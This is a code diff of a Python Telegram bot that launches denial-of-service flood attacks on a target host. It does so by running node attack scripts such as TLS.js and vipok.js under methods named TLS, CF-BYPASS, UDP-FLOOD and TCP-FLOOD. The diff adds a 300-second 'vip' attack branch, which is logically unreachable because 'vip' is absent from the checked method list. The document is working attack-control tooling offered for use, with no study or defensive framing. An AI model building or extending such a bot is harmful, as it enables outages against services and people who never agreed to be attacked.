@@ -287,6 +287,9 @@ def attack_command(message):
 
     if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
         # Update the command and duration based on the selected method
+        if method == 'vip':
+            command = ["node", "vipok.js", host, "300", "300", "5"]
+            duration = 300
         if method == 'TLS':
             command = ["node", "TLS.js", host, "90", "64", "5"]
             duration = 90
@@ -506,3 +509,4 @@ def invalid_command(message):
     bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
+
